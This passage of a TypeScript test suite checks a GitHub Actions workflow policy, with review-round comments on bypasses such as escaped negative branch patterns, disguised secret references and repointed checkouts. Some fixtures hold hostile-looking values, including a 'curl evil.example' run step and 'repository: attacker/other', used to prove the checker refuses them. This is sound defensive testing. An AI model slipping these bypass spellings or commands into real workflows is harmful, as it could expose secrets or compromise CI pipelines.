    const verdict = checkWorkflowShape(withLines("  push:", ["    branches-ignore:", '      - "**"']));

    assert.equal(verdict.ok, false, "branches-ignore was accepted");
  });

  /**
   * A NEGATIVE PATTERN AFTER `**` excludes everything it just included, and a
   * check that only looked for `**` being present saw nothing wrong. The
   * allowlist does not help here — `branches` is allowed — so the branch list
   * itself is checked for exclusions.
   */
  it("refuses a negative branch pattern that undoes the wildcard", () => {
    const undone = from(BASE.map((line) => (line === '      - "**"' ? '      - "**"\n      - "!**"' : line)));

    const verdict = checkTriggers(undone);

    assert.equal(verdict.ok, false, "a negative pattern excluding every branch was accepted");
  });

  it("refuses a repository input on checkout, which would verify another repository", () => {
    const repointed = withLines(`      - uses: actions/checkout@${"a".repeat(40)}`, [
      "        with:",
      "          repository: attacker/other",
    ]);

    const verdict = checkWorkflowShape(repointed);

    assert.equal(verdict.ok, false, "checkout was allowed to point elsewhere");
    assert.match(verdict.ok === false ? verdict.reason : "", /repository/);
  });

  it("refuses a ref input on checkout", () => {
    const repointed = withLines(`      - uses: actions/checkout@${"a".repeat(40)}`, [
      "        with:",
      "          ref: main",
    ]);

    assert.equal(checkWorkflowShape(repointed).ok, false);
  });

  it("refuses an unknown key at the workflow root", () => {
    assert.equal(checkWorkflowShape(from([...BASE, "concurrency:", "  group: x"])).ok, false);
  });

  /**
   * A MAP-SHAPED unknown event, so only the EVENT allowlist can refuse it.
   *
   * The first version used `schedule:`, which takes a sequence — and the
   * "filters are not a mapping" branch refused it whether or not the event
   * allowlist existed. `release` takes a mapping whose only key here is one the
   * allowlist already permits, leaving exactly one guard able to decide.
   */
  it("refuses an event nobody has reasoned about", () => {
    const released = from([
      ...BASE.slice(0, 8),
      "  release:",
      "    types:",
      "      - published",
      ...BASE.slice(8),
    ]);

    const verdict = checkWorkflowShape(released);

    assert.equal(verdict.ok, false, "an unreasoned-about event was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /release/);
  });
});

describe("TASK-017 round-2 CRITICAL 2: the repository must actually be checked out", () => {
  it("accepts the shipped workflow, which checks out first", () => {
    assert.equal(checkCheckout(shipped()).ok, true);
  });

  it("refuses a workflow that never checks out", () => {
    const verdict = checkCheckout(workflow({ uses: [`actions/setup-node@${"b".repeat(40)}`] }));

    assert.equal(verdict.ok, false, "a workflow verifying an unfetched tree was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /never checks out/);
  });

  it("refuses a workflow that checks out twice, so what ran is ambiguous", () => {
    const twice = workflow({
      uses: [`actions/checkout@${"a".repeat(40)}`, `actions/checkout@${"c".repeat(40)}`],
    });

    assert.equal(checkCheckout(twice).ok, false);
  });

  it("refuses a checkout that is not the first step", () => {
    const late = workflow({
      uses: [`actions/setup-node@${"b".repeat(40)}`, `actions/checkout@${"a".repeat(40)}`],
    });

    const verdict = checkCheckout(late);

    assert.equal(verdict.ok, false, "a step ran before the tree was fetched");
    assert.match(verdict.ok === false ? verdict.reason : "", /first step/);
  });
});

/**
 * TASK-017 round-2 HIGH 5: modelling shell execution is another guessing
 * machine, so the commands are simply written down.
 */
describe("TASK-017 round-2 HIGH 5: only allowlisted commands may run", () => {
  it("accepts the shipped workflow's two commands", () => {
    assert.equal(checkRunAllowlist(shipped()).ok, true);
  });

  for (const command of [
    "command npm install",
    "./node_modules/.bin/tsc -p tsconfig.json",
    "npx tsc",
    "sh -c 'npm install'",
    "npm ci --ignore-scripts",
  ]) {
    it(`refuses ${JSON.stringify(command)}`, () => {
      const verdict = checkRunAllowlist(workflow({ runs: ["npm ci", "npm test", command] }));

      assert.equal(verdict.ok, false, `${command} was accepted`);
    });
  }
});

/**
 * TASK-017 round-3 review: a scalar can be spelled so the reader does not see
 * what GitHub sees.
 *
 * YAML decodes escapes inside double quotes. `"\x21**"` IS `!**`, a negative
 * branch pattern excluding every branch, and `"${{ secrets\x2eSENSITIVE }}"`
 * IS a secret reference. Both passed every check, because the reader kept the
 * bytes and the checks looked at the bytes.
 *
 * Refused rather than decoded: a partial decoder handling `\x` but not `\u`
 * would reproduce the defect with a different spelling.
 */
describe("TASK-017 round-3 CRITICAL: escaped scalars are decoded, and the policy judges what they decode to", () => {
  /**
   * THIS FINDING IS NOW STOPPED ONE LAYER LOWER, AND STOPPED BETTER.
   *
   * The reviewer hid `!**` inside `"\x21**"` and a secret reference inside
   * `"${{ secrets\x2eS }}"`. The hand-written reader kept the bytes, so the
   * checks looked at the bytes and found nothing. The fix at the time was to
   * refuse ANY backslash — correct, but blunt: it refused the construct without
   * ever understanding the attack.
   *
   * A standards parser DECODES the escape, so the policy now sees `!**` and
   * `${{ secrets.S }}` and refuses them by name. The refusal went from "this
   * file contains a character I cannot handle" to "this excludes every branch
   * you just included", which is the same outcome for a better reason.
   */
  for (const [label, escaped, decoded] of [
    ["a hex escape", '"\\x21**"', "!**"],
    ["a unicode escape", '"\\u0021**"', "!**"],
    ["a newline escape", '"a\\nb"', "a\nb"],
    ["an escaped backslash", '"a\\\\b"', "a\\b"],
  ] as const) {
    it(`decodes ${label} rather than reporting its bytes`, () => {
      const parsed = parseWorkflow(`name: x\nvalue: ${escaped}\n`);

      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
      if (!parsed.ok) return;
      assert.equal(get(parsed.root, "value"), decoded);
    });
  }

  /** The reviewer's exact branch reproduction. */
  it("refuses a branch list hiding a negative pattern behind an escape", () => {
    const parsed = parseWorkflow(
      // `pull_request` IS DECLARED AND VALID so that only the escaped pattern
      // can decide this. Without it `checkTriggers` refused first for the
      // missing event and the case passed whatever the branch list said — the
      // sixth sibling-guard masking in this task, and one I wrote myself.
      ["name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
       "  push:", "    branches:", '      - "**"', '      - "\\x21**"', ""].join("\n"),
    );
    assert.equal(parsed.ok, true, "the escape should now be decoded, not refused");
    if (!parsed.ok) return;

    // DECODED: the policy is handed `!**`, not the bytes `\x21**`.
    assert.deepEqual(get(get(get(parsed.root, "on"), "push"), "branches"), { kind: "seq", items: ["**", "!**"] });

    const verdict = checkTriggers(parsed.root);

    assert.equal(verdict.ok, false, "an escaped negative pattern was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /excludes/);
  });

  /**
   * And the secret reproduction. The RAW SOURCE never contains `secrets.` — only
   * the decoded value does — so this case can only be caught by reading the
   * parsed structure, which is why `checkPermissions` checks both and is given a
   * clean source string here.
   */
  it("refuses an input hiding a secret reference behind an escape", () => {
    const raw = ["name: x", "jobs:", "  v:", "    steps:", "      - with:", '          k: "${{ secrets\\x2eS }}"', ""].join("\n");
    const parsed = parseWorkflow(raw);
    assert.equal(parsed.ok, true, "the escape should now be decoded, not refused");
    if (!parsed.ok) return;

    assert.equal(/secrets\./.test(raw), false, "the fixture no longer hides the reference");

    const verdict = checkPermissions(parsed.root, raw);

    assert.equal(verdict.ok, false, "an escaped secret reference was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /secret/);
  });

  /** And the expression check catches the same value independently. */
  it("refuses the decoded expression at the expression check too", () => {
    const parsed = parseWorkflow(
      ["name: x", "jobs:", "  v:", "    steps:", "      - with:", '          k: "${{ secrets\\x2eS }}"', ""].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    assert.equal(checkNoExpressions(parsed.root).ok, false, "a decoded expression was accepted");
  });

  /** The shipped workflow uses no escapes, so the refusals are not universal. */
  it("still parses the shipped workflow", () => {
    assert.equal(parseWorkflow(SOURCE).ok, true);
  });
});

describe("TASK-017: a secret cannot be named, however it is spelled", () => {
  /**
   * THREE ROUNDS OF BYPASSES WERE THREE SPELLINGS OF ONE THING:
   * `secrets.NAME`, `secrets['NAME']`, `toJSON(secrets)`, and `github.token`
   * which names no secret while being one. Matching spellings is the losing
   * game a closed policy exists to stop playing, so an EXPRESSION is refused
   * outright and every spelling inside one goes with it.
   *
   * THIS MOVED WHEN THE PARSER DID. `${{ ... }}` used to be refused as
   * unreadable syntax; to a standards parser it is an ordinary string, so the
   * refusal is now a statement about what this workflow may MEAN rather than
   * about what the reader can lex. The class is the same and the layer is not.
   */
  for (const [label, value] of [
    ["a dotted secret", "${{ secrets.S }}"],
    ["an indexed secret", "${{ secrets['S'] }}"],
    ["a serialised secrets context", "${{ toJSON(secrets) }}"],
    ["the implicit token", "${{ github.token }}"],
    ["any expression at all", "${{ github.sha }}"],
  ] as const) {
    it(`refuses ${label}`, () => {
      const parsed = parseWorkflow(`name: x\nvalue: ${value}\n`);
      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
      if (!parsed.ok) return;

      const verdict = checkNoExpressions(parsed.root);

      assert.equal(verdict.ok, false, `${value} was accepted`);
      assert.match(verdict.ok === false ? verdict.reason : "", /expression/);
    });
  }

  /** An expression hidden in a KEY is still an expression. */
  it("refuses an expression used as a key", () => {
    const parsed = parseWorkflow("name: x\n${{ github.token }}: y\n");
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    assert.equal(checkNoExpressions(parsed.root).ok, false, "an expression in key position was accepted");
  });

  /** NON-VACUITY: the expression check accepts the workflow that ships. */
  it("accepts the shipped workflow, which uses no expression", () => {
    assert.equal(checkNoExpressions(shipped()).ok, true);
  });

  /**
   * And `checkPermissions` keeps a case of its own, because the grammar and the
   * policy are independent layers and neither should be the other's only
   * evidence. A bare `secrets.` in a plain value needs no expression syntax.
   */
  /**
   * The BRACKET branch needs a case of its own. Inside an expression it is
   * redundant — the grammar refuses the whole expression — so the spelling
   * that exercises it is a plain value the grammar admits.
   */
  it("refuses an indexed secret named in a plain value", () => {
    const parsed = parseWorkflow(
      [
        "name: x",
        // A COMPLETE permissions block, so ONLY the secret check can
        // decide this. Without it the "no permissions block" refusal
        // fired first and the case passed either way — the fifth
        // sibling-guard masking in this task.
        "permissions:",
        "  contents: read",
        "jobs:",
        "  v:",
        "    steps:",
        "      - name: secrets['SENSITIVE']",
        "",
      ].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkPermissions(parsed.root, "raw source is clean");

    assert.equal(verdict.ok, false, "an indexed secret in a plain value was accepted");
  });

  it("refuses a secret named in a plain value with no expression syntax", () => {
    const parsed = parseWorkflow(
      [
        "name: x",
        // A COMPLETE permissions block, so ONLY the secret check can
        // decide this. Without it the "no permissions block" refusal
        // fired first and the case passed either way — the fifth
        // sibling-guard masking in this task.
        "permissions:",
        "  contents: read",
        "jobs:",
        "  v:",
        "    steps:",
        "      - name: secrets.SENSITIVE",
        "",
      ].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkPermissions(parsed.root, "raw source is clean");

    assert.equal(verdict.ok, false, "a secret named in a plain value was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /secret/);
  });
});

describe("TASK-017 round-3 HIGH 3: nothing runs before the checkout", () => {
  it("refuses a run step placed before the checkout", () => {
    const parsed = parseWorkflow(
      [
        "name: x",
        "jobs:",
        "  v:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - run: npm test",
        `      - uses: actions/checkout@${"a".repeat(40)}`,
        "",
      ].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkCheckout(parsed.root);

    assert.equal(verdict.ok, false, "a step ran before the tree was fetched");
    assert.match(verdict.ok === false ? verdict.reason : "", /first step/);
  });
});

/**
 * TASK-017 round-3 CRITICAL 4: a guard whose test can vanish is not a guard.
 *
 * The reviewer deleted `tests/workflowPolicy.test.ts`, set the runner to a
 * metered one, and the suite passed 2,042/2,042 — every policy in this task
 * switched off by removing one file, with nothing to notice it.
 *
 * `scripts/verify.mjs` now refuses when a required test source is absent. These
 * cases assert that the manifest exists and names the files whose loss would be
 * silent. THIS FILE IS ITSELF IN THE MANIFEST, so emptying these assertions
 * means deleting a file whose absence verification reports. That mutual
 * protection is where the regress stops; there is no further turtle.
 *
 * What it does NOT establish: that a required test is HONEST. A file emptied of
 * assertions is still present. Mutation and independent review cover that, and
 * a list of filenames does not pretend to.
 */
describe("TASK-017: a guarded module may not lose the test that guards it", () => {
  const VERIFIER = readFileSync(join(REPO_ROOT, "scripts/verify.mjs"), "utf8");

  /**
   * Three bypasses shaped this, and each is worth naming because each was a
   * different mistake:
   *
   *   - Deleting `tests/workflowPolicy.test.ts` disabled every policy in this
   *     task and the suite passed 2,042/2,042.
   *   - Keying the list on the package NAME let a one-word rename disable it.
   *   - Deriving its scope from the COMPILED set let a rewritten `tsconfig.json`
   *     compile one benign test and skip the gate entirely — and deleting every
   *     listed test did the same, because "none present" read as "not this
   *     repository" rather than "this repository with its safety tests removed".
   *
   * The question is now asked as a PAIR against BOTH the filesystem and the
   * compiled set: if a guarded module is here, its test must be here AND be
   * compiled. `existsSync` catches deletion; membership catches exclusion.
   */

  it("refuses when a guarded module has no test, rather than reporting a smaller run", () => {
    assert.match(
      VERIFIER,
      /if \(unguarded\.length > 0\)\s*\{[\s\S]{0,400}?fail\(/,
      "the manifest is declared but nothing fails when a pair is broken",
    );
  });

  /**
   * DELETION AND EXCLUSION ARE DIFFERENT HOLES, AND BOTH ARE NOW PROVEN BY
   * RUNNING THE VERIFIER rather than by reading it.
   *
   * This used to be two `assert.match` calls against the verifier's source
   * text. A mutation deleted the compiled-set line outright and this case
   * stayed green, because a COMMENT written during round-15 remediation
   * contained the very token the regex searched for. The case was checking
   * that somebody had typed a string, which is round 15's finding exactly.
   *
   * Both clauses moved to `tests/verificationHarnessEndToEnd.test.ts`:
   * "refuses a declared test that has been deleted" and "refuses a declared
   * test that exists but is excluded from compilation". Each declares a real
   * pair, withholds exactly one property, and asserts the refusal REASON.
   */

  it("nowhere names this repository, which would make the gate renameable", () => {
    assert.ok(
      !VERIFIER.includes("software-factory"),
      "the verifier names this repository, so a rename can change what it enforces",
    );
  });

  /**
   * EVERY PAIR, named individually. The previous version listed six of eight,
   * and the reviewer removed the seventh along with its manifest entry and
   * disabled the independent-review guard undetected.
   */
  /**
   * OVER THE IMPORTED VALUES, not the verifier's source text (round-8 review,
   * HIGH 4). Asserting `VERIFIER.includes("…")` meant commenting every entry
   * out left the text present and these cases green while the runtime manifest
   * was empty. A test that reads source text checks that somebody typed
   * something, not that anything happens.
   */
  for (const { module, test, marker } of GUARDED_MODULES) {
    it(`pairs ${module} with ${test}`, () => {
      assert.ok(existsSync(join(REPO_ROOT, module)), `${module} does not exist`);
      assert.ok(existsSync(join(REPO_ROOT, test)), `${test} does not exist`);
      assert.ok(
        readFileSync(join(REPO_ROOT, test), "utf8").includes(marker),
        `${test} never mentions ${marker}, so the pair is a label rather than a guard`,
      );
    });
  }

  /** Every pair the criteria depend on is actually in the manifest. */
  for (const [module, test] of [
    ["src/verification/workflowPolicy.ts", "tests/workflowPolicy.test.ts"],
    ["docs/KNOWN-LIMITATIONS.md", "tests/knownLimitationsHonesty.test.ts"],
    ["src/supervision/financialSafety.ts", "tests/pushAuthorization.test.ts"],
    ["src/adapters/github/ghCliClient.ts", "tests/githubCredentialBoundary.test.ts"],
    ["src/github/candidateBinding.ts", "tests/candidateBinding.test.ts"],
    ["src/github/publishCandidate.ts", "tests/publishCandidate.test.ts"],
    ["src/supervision/financialSafety.ts", "tests/financialSafetyGate.test.ts"],
    ["src/adapters/supervision/isolatedExecutor.ts", "tests/executorIsolation.test.ts"],
  ] as const) {
    it(`declares the pair ${module} -> ${test}`, () => {
      assert.ok(
        GUARDED_MODULES.some((entry) => entry.module === module && entry.test === test),
        `the manifest does not pair ${module} with ${test}`,
      );
    });
  }

  /** The workflow guard is anchored to the workflow, not only to its module. */
  it("anchors the workflow guard to the workflow itself", () => {
    const entry = GUARDED_MODULES.find(
      (candidate) => candidate.module === "src/verification/workflowPolicy.ts",
    );

    assert.ok(entry !== undefined, "the workflow policy is not in the manifest");
    assert.equal(
      entry?.anchor,
      ".github/workflows/verify.yml",
      "removing the policy module and its test together would go unnoticed",
    );
  });

  it("keeps at least the eight pairs named above", () => {
    assert.ok(GUARDED_MODULES.length >= 8, `the manifest declares only ${GUARDED_MODULES.length} pairs`);
  });

  /**
   * THE RELABELLING ATTACK (round-6 review, CRITICAL 3). Pointing a module at
   * some OTHER existing test satisfied a presence check while the real guard
   * was deleted — and the assertions that would have caught it lived in the
   * file being deleted, which is the circularity. The marker check lives in
   * `verify.mjs`, the trusted core, so there is nothing to escape through.
   */

  it("requires the verifier itself to check the marker, not just the paths", () => {
    assert.match(
      VERIFIER,
      /body\.includes\(marker\)/,
      "the verifier does not check that a paired test mentions the module it guards",
    );
  });
});

describe("TASK-017 round-4 CRITICAL: invalid YAML is refused, not reinterpreted", () => {
  /**
   * EVERY CASE HERE STILL REFUSES, AND NONE OF THEM IS OUR CODE ANY MORE.
   *
   * These were hand-written refusals, and each arrived as a defect: the escape
   * list matched valid FORMS so `\q` sailed through as a literal; duplicate
   * detection lived on one of the two paths that built mappings, so a duplicate
   * inside a sequence item was silently resolved to the first value.
   *
   * They are now the parser's answers, and they are asserted rather than assumed
   * — a dependency that stopped enforcing `uniqueKeys` would be a silent
   * downgrade of a CRITICAL, so the round-4 findings keep their cases.
   */
  it("refuses an invalid escape, not merely the valid ones", () => {
    const parsed = parseWorkflow('name: "\\q"\n');

    assert.equal(parsed.ok, false, "an invalid escape was read literally");
    assert.match(parsed.ok === false ? parsed.reason : "", /escape/i);
  });

  it("refuses an unterminated quoted scalar", () => {
    const parsed = parseWorkflow('name: "verify\n');

    assert.equal(parsed.ok, false, "an unterminated quote became part of the value");
    assert.match(parsed.ok === false ? parsed.reason : "", /quote/i);
  });

  it("refuses non-breaking spaces used as indentation", () => {
    // `trimStart()` treats U+00A0 as whitespace and YAML does not, so the old
    // reader computed a depth the file does not have. The parser reads it as
    // part of a scalar, which leaves `jobs:` null — refused either way.
    const parsed = parseWorkflow("jobs:\n\u00a0\u00a0verify: x\n");

    assert.equal(parsed.ok, false, "non-ASCII whitespace was counted as indentation");
  });

  /**
   * THE CONFIDENT WRONG ANSWER. `get()` returned the FIRST match, so a second
   * `permissions:` granting write was reported as read-only. YAML
   * implementations disagree about duplicates and GitHub's is not necessarily
   * this one, so refusing is the only honest move — now enforced by the parser's
   * `uniqueKeys` rather than by a hand-written pass over each mapping.
   */
  it("refuses a mapping that declares the same key twice", () => {
    const parsed = parseWorkflow(
      ["permissions:", "  contents: read", "other: x", "permissions:", "  contents: write", ""].join("\n"),
    );

    assert.equal(parsed.ok, false, "a duplicate key was silently resolved");
    assert.match(parsed.ok === false ? parsed.reason : "", /unique/i);
  });

  /**
   * A SEQUENCE-ITEM MAPPING IS STILL A MAPPING (round-5 review, CRITICAL 1).
   * Duplicate detection lived on the ordinary mapping path only, so
   * `- run: npm ci` followed by `  run: npm install` was read as the first
   * value and the second silently vanished. There is only one mapping path now.
   */
  it("refuses a duplicate key inside a sequence-item mapping", () => {
    const parsed = parseWorkflow(
      ["jobs:", "  v:", "    steps:", "      - run: npm ci", "        run: npm install", ""].join("\n"),
    );

    assert.equal(parsed.ok, false, "a duplicate key inside a step was silently resolved");
    assert.match(parsed.ok === false ? parsed.reason : "", /unique/i);
  });

  it("refuses a duplicate key nested inside a job", () => {
    const parsed = parseWorkflow(
      ["jobs:", "  v:", "    runs-on: ubuntu-latest", "    runs-on: macos-14", ""].join("\n"),
    );

    assert.equal(parsed.ok, false, "a duplicate nested key was silently resolved");
  });

  /** And a duplicate in FLOW syntax, which the old reader never reached. */
  it("refuses a duplicate key in a flow mapping", () => {
    const parsed = parseWorkflow("job: { run: npm ci, run: npm install }\n");

    assert.equal(parsed.ok, false, "a duplicate key in flow syntax was silently resolved");
  });

  /** A plain scalar may CONTAIN quotes; only an opening quote makes it quoted. */
  it("still reads a plain scalar that ends with a quote", () => {
    const parsed = parseWorkflow("run: true && echo 'npm ci'\n");

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.equal(get(parsed.root, "run"), "true && echo 'npm ci'");
  });

  it("still parses the shipped workflow", () => {
    assert.equal(parseWorkflow(SOURCE).ok, true);
  });
});

/**
 * TASK-017 round-4 CRITICAL 2: the manifest gate must not be a renameable label.
 *
 * I gated it on the package NAME and wrote that renaming would break the
 * package scripts. The reviewer renamed it to "fixture", deleted a required
 * test, and the suite passed. The claim was false, and it was stated in the one
 * place a reader would go for the reasoning.
 */


describe("TASK-017 round-6 CRITICAL: context syntax and flow items", () => {
  /**
   * The two secret spellings moved to the expression check — see "a secret
   * cannot be named, however it is spelled" above. Kept as a pointer rather
   * than deleted silently, because a reader looking for the round-6 finding
   * should find where it went.
   */
  it("refuses both secret spellings, now at the policy rather than the grammar", () => {
    for (const value of ["${{ secrets['S'] }}", "${{ secrets.S }}"]) {
      const parsed = parseWorkflow(`name: x\nvalue: ${value}\n`);
      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
      if (!parsed.ok) return;

      assert.equal(checkNoExpressions(parsed.root).ok, false, `${value} was accepted`);
    }
  });

  /** A bare `!` is a tag YAML strips and the old reader kept. */
  it("refuses a bare tag with a space after it", () => {
    const parsed = parseWorkflow("name: x\nvalue: ! something\n");

    assert.equal(parsed.ok, false, "a bare tag was read as part of the value");
    assert.match(parsed.ok === false ? parsed.reason : "", /tag/);
  });

  /**
   * THE FLOW-ITEM FINDING, AND A DEFECT THE PARSER REPLACEMENT EXPOSED.
   *
   * `- ["!**"]` was read as the STRING `["!**"]`, so the trigger check saw a
   * harmless pattern. The fix at the time refused flow collections in sequence
   * items — which made this case unreachable rather than correct.
   *
   * Read properly it is a sequence inside a sequence, and that exposed a SECOND
   * defect one layer up: `checkTriggers` filtered non-strings out of the branch
   * list and reported on the remainder, so `["**", ["!**"]]` was judged as
   * `["**"]` and PASSED. Discarding what you cannot interpret and describing
   * the rest is the same misread the parser replacement exists to end.
   */
  it("refuses a branch list whose items are not all patterns", () => {
    const parsed = parseWorkflow(
      // `pull_request` declared and valid, so only the nested item decides this.
      ["name: x", "on:", "  pull_request:", "    branches:", '      - "**"',
       "  push:", "    branches:", '      - "**"', '      - ["!**"]', ""].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    // The structure really is nested — the policy is not being handed a string.
    assert.deepEqual(get(get(get(parsed.root, "on"), "push"), "branches"), {
      kind: "seq",
      items: ["**", { kind: "seq", items: ["!**"] }],
    });

    const verdict = checkTriggers(parsed.root);

    assert.equal(verdict.ok, false, "a nested sequence was filtered out and the rest reported as fine");
    assert.match(verdict.ok === false ? verdict.reason : "", /cannot read as a list of patterns/);
  });

  /** The same for pull_request activity types. */
  it("refuses an activity-type list whose items are not all names", () => {
    const parsed = parseWorkflow(
      ["name: x", "on:", "  pull_request:", "    types:", "      - opened", "      - [synchronize]",
       "  push:", "    branches:", '      - "**"', ""].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkTriggers(parsed.root);

    assert.equal(verdict.ok, false, "a nested sequence in types was filtered out");
    assert.match(verdict.ok === false ? verdict.reason : "", /cannot read as a list of activity names/);
  });

  /**
   * A flow mapping used as a step is now READ, so the with-key allowlist has to
   * hold in flow syntax exactly as it does in block syntax. The round-2 finding
   * was a repointed checkout; this is the same attack in the notation the old
   * reader refused to look at.
   */
  it("refuses a flow-mapping step that repoints the checkout", () => {
    const parsed = parseWorkflow(
      ["name: x", "on:", "  pull_request:", "    branches:", '      - "**"', "  push:", "    branches:", '      - "**"',
       "permissions:", "  contents: read", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
       `      - { uses: "actions/checkout@${"a".repeat(40)}", with: { repository: someone/else } }`, ""].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkWorkflowShape(parsed.root);

    assert.equal(verdict.ok, false, "a flow-mapping step bypassed the with-key allowlist");
    assert.match(verdict.ok === false ? verdict.reason : "", /repository/);
  });

  /** And a flow-mapping step still reaches the command allowlist. */
  it("reads a flow-mapping step as a step", () => {
    const parsed = parseWorkflow(["jobs:", "  v:", "    steps:", "      - { run: curl evil.example }", ""].join("\n"));
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    assert.deepEqual(runCommands(parsed.root), ["curl evil.example"]);
    assert.equal(checkRunAllowlist(parsed.root).ok, false, "a flow-mapping command escaped the allowlist");
  });

  it("still parses the shipped workflow", () => {
    assert.equal(parseWorkflow(SOURCE).ok, true);
  });
});

/**
 * TASK-017 round-7 review: the reviewer's diagnosis, and what became of it.
 *
 * The diagnosis was exact — "the hand-written approach can converge only if it
 * enforces a genuinely closed grammar; this implementation has not converged".
 * Six rounds had each found another construct the denylist had not anticipated,
 * because a denylist can only hold what somebody thought of. The answer at the
 * time was to close the scalar grammar: state what is ADMITTED, refuse the rest.
 *
 * Round 8 then found two more defects in it, and the owner's decision was that a
 * hand-written YAML grammar is the wrong thing to be maintaining at a trust
 * boundary at all. So the closure moved: SYNTAX is now the parser's problem, and
 * what stays closed here is the SEMANTIC allowlist — which keys, events,
 * runners, inputs and commands this workflow may contain.
 *
 * These cases are kept because they are still the right questions. Most of these
 * values are still refused, now by a parser that refuses them for the reason the
 * YAML spec gives. Two are not, and are read correctly instead.
 */
describe("TASK-017 round-7 CRITICAL: what a scalar may be is not decided by guesswork", () => {
  /** Still refused, now with the spec's reason rather than ours. */
  for (const [label, value, reason] of [
    ["a reserved indicator", "@not-yaml", /reserved/i],
    ["a block-scalar opener", "|foo", /block scalar/i],
    ["a folded-scalar opener", ">foo", /block scalar/i],
    ["a key-looking value", "foo: bar", /nested mappings|not valid YAML/i],
    ["an anchor-looking value", "&anchor", /anchor/i],
    ["an alias-looking value", "*alias", /alias/i],
    ["a directive", "%YAML 1.2", /directive/i],
    ["a backtick", "`command`", /reserved/i],
  ] as const) {
    it(`refuses ${label}`, () => {
      const parsed = parseWorkflow(`name: ${value}\n`);

      assert.equal(parsed.ok, false, `${JSON.stringify(value)} was admitted`);
      assert.match(
        parsed.ok === false ? parsed.reason : "",
        reason,
        `${label} was refused, but not for the reason that names it`,
      );
    });
  }

  /**
   * THESE TWO ARE NO LONGER REFUSED, AND THAT IS THE CORRECTION.
   *
   * `[a, b]` is a sequence and `'a''b'` is the three characters `a'b`. The old
   * grammar refused both because it could not read them, and refusing what you
   * cannot read is only safe while nothing needs the answer. The policy needs
   * the answer — a flow sequence in a branch list is exactly the round-6 attack
   * — so it is read, and judged.
   */
  it("reads a flow sequence rather than refusing it", () => {
    const parsed = parseWorkflow("name: [a, b]\n");

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.deepEqual(get(parsed.root, "name"), { kind: "seq", items: ["a", "b"] });
  });

  it("reads a doubled quote as the single character YAML says it is", () => {
    const parsed = parseWorkflow("name: 'a''b'\n");

    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;
    assert.equal(get(parsed.root, "name"), "a'b");
  });

  /**
   * AND THE CLOSURE THAT REPLACED THE GRAMMAR: a root key nobody has reasoned
   * about is refused. This is where "not thinking of it is the refusing case"
   * lives now, and it is the half that had to survive the move.
   */
  it("refuses a root key this policy has not reasoned about", () => {
    const parsed = parseWorkflow("name: x\nconcurrency:\n  group: g\n");
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkWorkflowShape(parsed.root);

    assert.equal(verdict.ok, false, "an unmodelled root key was accepted");
    assert.match(verdict.ok === false ? verdict.reason : "", /concurrency/);
  });

  /** THE OTHER HALF: ordinary values must still be admitted. */
  for (const [label, value, expected] of [
    ["a plain word", "verify", "verify"],
    ["a dotted version", "22.5.0", "22.5.0"],
    ["a path", "src/verification/workflowPolicy.ts", "src/verification/workflowPolicy.ts"],
    ["a command with quotes", "true && echo 'npm ci'", "true && echo 'npm ci'"],
    ["a quoted wildcard", '"**"', "**"],
    ["a pinned action", "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
     "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"],
  ] as const) {
    it(`still admits ${label}`, () => {
      const parsed = parseWorkflow(`name: ${value}\n`);

      assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
      if (!parsed.ok) return;
      assert.equal(get(parsed.root, "name"), expected);
    });
  }

  it("still parses the shipped workflow", () => {
    assert.equal(parseWorkflow(SOURCE).ok, true);
  });
});

/**
 * TASK-017 round-7 HIGH 4: jobs have separate workspaces.
 *
 * `steps()` concatenated every job's steps, so a second job with no checkout
 * and no Node pin passed every check on the strength of the first job's. That
 * is not a missing refusal — it is reading two workspaces as one.
 */
describe("TASK-017 round-7 HIGH 4: a second job is not covered by the first", () => {
  it("refuses a workflow declaring more than one job", () => {
    const parsed = parseWorkflow(
      [
        "name: x",
        "on:",
        "  push:",
        "    branches:",
        '      - "**"',
        "permissions:",
        "  contents: read",
        "jobs:",
        "  verify:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        `      - uses: actions/checkout@${"a".repeat(40)}`,
        "  unclean:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - run: npm test",
        "",
      ].join("\n"),
    );
    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
    if (!parsed.ok) return;

    const verdict = checkWorkflowShape(parsed.root);

    assert.equal(verdict.ok, false, "a second job rode on the first job's checkout");
